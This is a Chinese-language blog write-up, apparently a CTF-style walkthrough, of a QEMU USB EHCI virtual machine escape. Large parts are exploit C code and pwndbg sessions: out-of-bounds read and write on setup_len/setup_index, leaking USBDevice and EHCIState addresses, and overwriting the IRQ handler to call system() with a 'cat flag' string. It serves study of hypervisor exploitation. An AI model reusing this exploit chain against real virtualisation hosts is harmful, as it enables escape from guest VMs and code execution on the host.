<p>通过越界写将<code>setup_len</code>设置为<code>offset+0x8</code>，将<code>setup_index</code>设置为<code>offset-0x1010</code>，那么在这一次越界写入结束之后<code>setup_index=offset</code>，在下一次调用写函数的时候目标地址就变为了<code>offset</code>，拷贝长度<code>len=offset+0x8-(offset - 0x1010)=0x1018</code>。完成任意写。</p>
<h2 id="整体利用思路"><a href="#整体利用思路" class="headerlink" title="整体利用思路"></a>整体利用思路</h2><ol>
<li><p>获取<code>USBDevice</code>对象的地址。</p>
<p>首先进行越界读取<code>data_buf+0x2004</code>即可以得到<code>USBDevice-&gt;remote_wakeup</code>的内容，继续往下读取可以得到<code>USBEndpoint ep_ctl;</code>成员变量的内容，我们看一下该结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> nr;</span><br><span class="line">    <span class="type">uint8_t</span> pid;</span><br><span class="line">    <span class="type">uint8_t</span> type;</span><br><span class="line">    <span class="type">uint8_t</span> ifnum;</span><br><span class="line">    <span class="type">int</span> max_packet_size;</span><br><span class="line">    <span class="type">int</span> max_streams;</span><br><span class="line">    <span class="type">bool</span> pipeline;</span><br><span class="line">    <span class="type">bool</span> halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    QTAILQ_HEAD(, USBPacket) <span class="built_in">queue</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>那么可以看到这里保存了一个<code>USBDevice</code>对象的指针，我们读取该指针即可以得到<code>USBDevice</code>对象的地址。得到改地址之后通过偏移即可以知道<code>data_buf,port</code>的地址。</p>
</li>
<li><p>再继续往下读取，可以发现一个成员变量<code>USBDescDevice *device;</code>，通过该变量我们可以知道<code>system</code>的地址。</p>
</li>
<li><p><code>USBDevice</code>在<code>realize</code>的时候会调用<code>usb_claim_port</code>函数用来将<code>USBDevice</code>中的<code>port</code>字段设置为指向<code>EHCIState</code>中的<code>ports</code>的地址，读取<code>USBDevice-&gt;ports</code>的内容（调用任意读读取<code>1</code>中得到的<code>port</code>地址得到指针值）就能够得到<code>EHCIState-&gt;ports</code>的地址，减去偏移即可得到<code>EHCIState</code>的基地址，进而可以根据偏移得到<code>EHCIState-&gt;irq</code>的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usb_claim_port</span><span class="params">(USBDevice *dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    USBBus *bus = usb_bus_from_device(dev);<span class="comment">// dev-&gt;qdev.parent_bus</span></span><br><span class="line">    USBPort *port;</span><br><span class="line"></span><br><span class="line">    assert(dev-&gt;port == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;port_path) &#123;</span><br><span class="line">        QTAILQ_FOREACH(port, &amp;bus-&gt;<span class="built_in">free</span>, next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(port-&gt;path, dev-&gt;port_path) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (port == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;usb port %s (bus %s) not found (in use?)&quot;</span>,</span><br><span class="line">                       dev-&gt;port_path, bus-&gt;qbus.name);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (bus-&gt;nfree == <span class="number">1</span> &amp;&amp; <span class="built_in">strcmp</span>(object_get_typename(OBJECT(dev)), <span class="string">&quot;usb-hub&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* Create a new hub and chain it on */</span></span><br><span class="line">            usb_try_create_simple(bus, <span class="string">&quot;usb-hub&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bus-&gt;nfree == <span class="number">0</span>) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;tried to attach usb device %s to a bus &quot;</span></span><br><span class="line">                       <span class="string">&quot;with no free ports&quot;</span>, dev-&gt;product_desc);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        port = QTAILQ_FIRST(&amp;bus-&gt;<span class="built_in">free</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    trace_usb_port_claim(bus-&gt;busnr, port-&gt;path);</span><br><span class="line"></span><br><span class="line">    QTAILQ_REMOVE(&amp;bus-&gt;<span class="built_in">free</span>, port, next);</span><br><span class="line">    bus-&gt;nfree--;</span><br><span class="line"></span><br><span class="line">    dev-&gt;port = port;</span><br><span class="line">    port-&gt;dev = dev;</span><br><span class="line"></span><br><span class="line">    QTAILQ_INSERT_TAIL(&amp;bus-&gt;used, port, next);</span><br><span class="line">    bus-&gt;nused++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>利用任意写将<code>EHCIState-&gt;irq</code>内容填充为伪造的<code>irq</code>地址，将<code>handler</code>填充为<code>system.plt</code>的地址，将<code>opaque</code>填充为<code>payload</code>的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    qemu_irq_handler handler;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> *<span class="title">qemu_irq</span>;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">qemu_set_irq</span><span class="params">(qemu_irq irq, <span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!irq)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="EXP-amp-漏洞调试"><a href="#EXP-amp-漏洞调试" class="headerlink" title="EXP&amp;漏洞调试"></a>EXP&amp;漏洞调试</h2><h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p>我们根据<code>exp.c</code>来进行一下漏洞的调试，首先看一下<code>main</code>函数的开始部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[41;37m[*] Beginning\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Wait a moment\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 1/3\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">1</span>);</span><br><span class="line">    device_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">36</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        device_addr |= tmp &lt;&lt; ((i<span class="number">-36</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    func_addr = <span class="number">0</span>;</span><br><span class="line">    port_addr = device_addr+<span class="number">0x78</span>;</span><br><span class="line">    data_buf_addr = device_addr+<span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Devices addr : 0x%lx\033[0m\n&quot;</span>,device_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Port addr : 0x%lx\033[0m\n&quot;</span>,port_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Data Buf addr : 0x%lx\033[0m\n&quot;</span>,data_buf_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0x4fc</span>;i&lt;<span class="number">0x4fc</span>+<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        func_addr |= tmp &lt;&lt; ((i<span class="number">-0x4fc</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    proc_base = func_addr - <span class="number">0x1069490</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Func addr : 0x%lx\033[0m\n&quot;</span>,func_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] proc base : 0x%lx\033[0m\n&quot;</span>,proc_base);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//uint64_t system_addr = func_addr - 0xb5c860;</span></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = proc_base + <span class="number">0x2BE010</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] System addr : 0x%lx\033[0m\n&quot;</span>,system_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先调用了<code>init</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dmabuf = mmap(<span class="number">0</span>, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (dmabuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(dmabuf, <span class="number">0x3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;[*] mmio_mem : %p\n&quot;, mmio_mem);</span></span><br><span class="line">    <span class="comment">//printf(&quot;[*] dmabuf : %p\n&quot;,dmabuf);</span></span><br><span class="line"></span><br><span class="line">    entry = dmabuf + <span class="number">0x4</span>;</span><br><span class="line">    qh = dmabuf + <span class="number">0x100</span>;</span><br><span class="line">    qtd = dmabuf + <span class="number">0x200</span>;</span><br><span class="line">    setup_buf = dmabuf + <span class="number">0x300</span>;</span><br><span class="line">    data_buf = dmabuf + <span class="number">0x1000</span>;</span><br><span class="line">    data_bufoob = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    first_leak_data = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    second_leak_data = dmabuf + <span class="number">0x1000</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数主要是对<code>resource</code>进行了映射，即读写<code>mmio_mem</code>这段内存即可对设备进行操作。接着调用了<code>oob_read</code>即越界读，读取<code>data_buf</code>偏移之后的内容获取得到一系列的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">oob_read</span><span class="params">(<span class="type">uint64_t</span> length,<span class="type">int</span> flag)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        perpare_read();</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] perpare read finished\033[0m&quot;</span>);</span><br><span class="line">        set_length(length);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] set length finished\033[0m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data_buf[<span class="number">0</span>] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">2</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">3</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">4</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">5</span>] = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] oob read start\033[0m&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf)); <span class="comment">// periodiclistbase</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数中的<code>flag</code>表示的是否是<code>write</code>之后的第一次读，因为如果是第一次读的话需要设置<code>s-&gt;setup_state</code>的值。需要注意的是这里长度并不是根据传入的值来的，而是写死的<code>0x1e00</code>，虽然该函数一开始传入的是<code>0x2000</code>，但是在<code>do_token_in</code>函数中会存在一个判断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line"><span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">  len = p-&gt;iov.size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这里的<code>iov.size</code>是根据<code>token</code>的值设置的。因此这里设置的总是<code>iov.size</code>的值，也就是写死的<code>0x1e00</code>。调用<code>prepare_read</code>函数设置完毕<code>s-&gt;setup_state</code>之后又调用了<code>set_length</code>设置<code>setup_len</code>为溢出的值，接着就调用了<code>do_token_in</code>函数进行越界的读取，读取出来的地址我们根据<code>qtd.bufptr</code>数组指定。</p>
<p>泄漏了<code>data_buf</code>结构体之后<code>0xe00</code>大小的<code>USBDevice</code>的其他成员变量的内容，这里在偏移<code>0x24</code>的位置存储了一个<code>USBDevice</code>结构体指针指向本结构体，因此这里我们可以得到结构体的基地址，进而计算得到<code>port/data_buf</code>的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;s-&gt;data_buf</span><br><span class="line">$<span class="number">43</span> = (<span class="type">uint8_t</span> (*)[<span class="number">4096</span>]) <span class="number">0x5555576b539c</span></span><br><span class="line">pwndbg&gt; p s-&gt;ep_ctl.dev</span><br><span class="line">$<span class="number">44</span> = (USBDevice *) <span class="number">0x5555576b52c0</span></span><br><span class="line">pwndbg&gt; p &amp;s-&gt;ep_ctl.dev</span><br><span class="line">$<span class="number">45</span> = (USBDevice **) <span class="number">0x5555576b63c0</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x5555576b63c0</span> -  <span class="number">0x5555576b539c</span> - <span class="number">0x1000</span></span><br><span class="line">$<span class="number">46</span> = <span class="number">0x24</span></span><br><span class="line">pwndbg&gt; p s</span><br><span class="line">$<span class="number">47</span> = (USBDevice *) <span class="number">0x5555576b52c0</span></span><br></pre></td></tr></table></figure>

<p><code>USBDevice</code>结构体中还存在一个成员变量<code>device</code>指向一个<code>bss</code>段中的地址，这里我们可以据此泄漏出<code>elf</code>的基地址，进而得到<code>system.plt</code>的地址，该成员变量距离<code>data_buf.end</code>的偏移是<code>0x4fc</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p s-&gt;device</span><br><span class="line">$<span class="number">48</span> = (<span class="type">const</span> USBDescDevice *) <span class="number">0x5555565bf170</span> &lt;desc_device_high&gt;</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x5555565bf170</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x5555564fe000</span>     <span class="number">0x555556614000</span> r--p   <span class="number">116000</span> daa000 /root/pwn/漏洞/qemu_escape/qemu-source/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 +<span class="number">0xc1170</span></span><br><span class="line">pwndbg&gt; p &amp;s-&gt;device</span><br><span class="line">$<span class="number">49</span> = (<span class="type">const</span> USBDescDevice **) <span class="number">0x5555576b6898</span></span><br><span class="line">pwndbg&gt; p &amp;s-&gt;data_buf</span><br><span class="line">$<span class="number">50</span> = (<span class="type">uint8_t</span> (*)[<span class="number">4096</span>]) <span class="number">0x5555576b539c</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x5555576b6898</span><span class="number">-0x5555576b539c</span><span class="number">-0x1000</span></span><br><span class="line">$<span class="number">51</span> = <span class="number">0x4fc</span></span><br></pre></td></tr></table></figure>

<p>因此在第一步结束之后我们得到了<code>port/data_buf</code>等<code>USBDevice</code>成员变量的地址以及<code>system.plt</code>的地址。</p>
<h3 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h3><p>这一步是为了获取<code>EHCIState</code>结构体的地址，我们看一下这一部分的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 2/3\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">anywhere_read(port_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">  <span class="type">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">  port_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] port ptr : 0x%lx\033[0m\n&quot;</span>,port_ptr);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> EHCIState_addr = port_ptr - <span class="number">0x530</span>;</span><br><span class="line"><span class="type">uint64_t</span> irq_addr = EHCIState_addr + <span class="number">0xb8</span>;</span><br><span class="line"><span class="type">uint64_t</span> fake_irq_addr = data_buf_addr;</span><br><span class="line"><span class="type">uint64_t</span> irq_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">anywhere_read(irq_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">  <span class="type">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">  irq_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Port ptr : 0x%lx\033[0m\n&quot;</span>,port_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] EHCIState addr : 0x%lx\033[0m\n&quot;</span>,EHCIState_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] IRQ addr : 0x%lx\033[0m\n&quot;</span>,irq_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Fake IRQ addr : 0x%lx\033[0m\n&quot;</span>,fake_irq_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] IRQ ptr : 0x%lx\033[0m\n&quot;</span>,irq_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x28</span>) = system_addr;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x30</span>) = device_addr+<span class="number">0xdc</span>+<span class="number">0x100</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x38</span>) = <span class="number">0x3</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(data_buf + <span class="number">0x100</span>) = <span class="number">0x67616c6620746163</span>;</span><br></pre></td></tr></table></figure>

<p>首先是调用了任意读的函数读取了我们在第一步中泄漏的<code>port</code>的地址中存储的内容。我们先来看一下<code>anywhere_read</code>函数的逻辑。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">anywhere_read</span><span class="params">(<span class="type">uint64_t</span> target_addr)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Anywhere Read\033[0m&quot;</span>);</span><br><span class="line">    <span class="comment">//set_length(0x1010);</span></span><br><span class="line">    oob_write(<span class="number">0x0</span>,<span class="number">0x1010</span>,<span class="number">0xfffffff8</span><span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf) = <span class="number">0x2000000000000080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> target_offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0x8</span>,<span class="number">0xffff</span>,target_offset - <span class="number">0x1018</span>,<span class="number">0</span>);</span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先调用越界写函数覆写<code>setup_len</code>和<code>setup_index</code>。这里我们看一下<code>oob_write</code>函数。</p>
